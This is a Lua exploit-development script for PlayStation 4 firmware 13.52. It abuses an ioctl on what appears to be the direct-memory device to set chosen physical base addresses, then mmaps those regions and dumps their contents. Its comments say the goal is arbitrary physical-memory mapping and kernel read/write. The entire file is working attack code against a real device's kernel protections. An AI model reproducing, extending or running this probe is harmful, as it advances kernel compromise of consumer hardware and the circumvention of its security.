-- PS4 FW 13.52 - ARBITRARY-PHYS MAPPING TEST (r9v) — the big one
-- After ioctl set base, mmap@base identity-maps phys. Test non-descriptor phys:
-- 1GB (0x40000000) and 2GB (0x80000000) — both accepted by ioctl validation.
-- Non-zero content = arbitrary phys map = kernel R/W via dmem0!

local mem = rawget(_G, "memory")
local S = rawget(_G, "syscall")

pcall(S.resolve, { ioctl = 54, mmap = 477 })

local function t(v)
  if v == nil then return -1 end
  if type(v) == "number" then return v end
  if type(v) == "table" and v.h ~= nil then return v.h * 4294967296 + v.l end
  return tonumber(tostring(v)) or -1
end
local function rq(a) return t(mem.read_qword(a)) end

print("=== R9V START ===")
pcall(function()
  local buf = mem.alloc(0x200)

  local bases = {0x40000000, 0x80000000, 0x30000000, 0x10000000}
  for _, base in ipairs(bases) do
    pcall(function()
      mem.write_buffer(buf, string.rep(string.char(0x00), 0x200), 0x200)
      mem.write_qword(buf, base)
      mem.write_qword(buf + 8, 0x100000)
      local r = t(S.ioctl(5, 0x80108002, buf))
      local m = t(S.mmap(base, 0x100000, 3, 0x0001, 5, 0))
      local s = string.format("base=0x%08x ioctl=0x%x mmap=0x%x content:", base, r, m)
      if m > 0x100000 and m < 0xFFFFFFFFFF then
        for i = 0, 5 do s = s .. string.format(" 0x%016x", rq(m + i * 8)) end
        print(s)
      else
        print(string.format("base=0x%08x ioctl=0x%x mmap=0x%x (FAIL)", base, r, m))
      end
    end)
  end

  print("--- window expansion: set 16MB at descriptor region, mmap 16MB ---")
  pcall(function()
    mem.write_buffer(buf, string.rep(string.char(0x00), 0x200), 0x200)
    mem.write_qword(buf, 0x2ec48000)
    mem.write_qword(buf + 8, 0x1000000)
    local r = t(S.ioctl(5, 0x80108002, buf))
    local m = t(S.mmap(0x2ec48000, 0x1000000, 3, 0x0001, 5, 0))
    print(string.format("  ioctl(16MB at 0x2ec48000)=0x%x mmap=0x%x", r, m))
    if m > 0x100000 and m < 0xFFFFFFFFFF then
      print(string.format("  +0x0: 0x%016x  +0x100000: 0x%016x  +0x200000: 0x%016x",
        rq(m), rq(m + 0x100000), rq(m + 0x200000)))
      print(string.format("  +0x400000: 0x%016x  +0x800000: 0x%016x  +0xF00000: 0x%016x",
        rq(m + 0x400000), rq(m + 0x800000), rq(m + 0xF00000)))
    end
  end)
end)
print("=== R9V DONE ===")
